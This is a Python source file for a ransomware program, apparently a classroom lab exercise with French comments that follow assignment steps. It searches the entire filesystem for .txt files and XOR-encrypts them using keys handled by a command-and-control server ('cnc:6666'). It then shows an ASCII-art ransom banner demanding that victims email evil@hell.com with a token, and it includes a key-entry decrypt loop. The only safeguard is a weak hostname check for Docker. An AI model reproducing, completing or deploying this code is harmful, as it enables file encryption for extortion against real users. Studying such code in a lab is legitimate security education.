import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # Séparer les parties du chemin
        path = Path("/")
        # Relever les fichiers qui contiennent la chaîne de caractères définie dans le paramètre filter 
        files = path.rglob(filter)
        # Créer une liste contentant les fichiers relévés
        files_list = [file for file in files]
        # Transformer la liste en une nouvelle liste de chaînes de carcatères
        files_list_str = [str(file_list) for file_list in files_list]
        # return all files matching the filter
        return files_list_str

    def encrypt(self):
        # Récupérer les fichiers txt
        files_txt = self.get_files("*.txt")
        # Créer le SecretManager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        # Appeler setup()
        secret_manager.setup()
        # Chiffrer les fichiers
        secret_manager.xorfiles(files_txt)
        token = secret_manager.get_hex_token()
        # Afficher un message permettant à la victime de contacter l'attaquant avec le token au format hex
        print("Your data has been stolen.")
        print(token)

    def decrypt(self):
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        # Charger les éléments cryptographiques
        secret_manager.load()
        # Récupérer les fichiers txt sous forme de liste
        files_txt = self.get_files("*.txt")

        while True:
            try:
                # Demander d'entrer la clé
                key_input = input("Write the key to decrypt your files here: ")
                # Appeler set_key
                secret_manager.set_key(key_input)
                # Appeler xorfiles sur la liste de fichier
                secret_manager.xorfiles(files_txt)
                # Appeler clean
                secret_manager.clean()
                # Afficher un message pour informer que tout c’est bien passé
                print("Everything is OK.")
                # Sortir du ransomware
                break
            # En cas d’echec :
            except ValueError as error:
                # Afficher un message indiquant que la clef est mauvaise
                print("This is not the good key.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt() 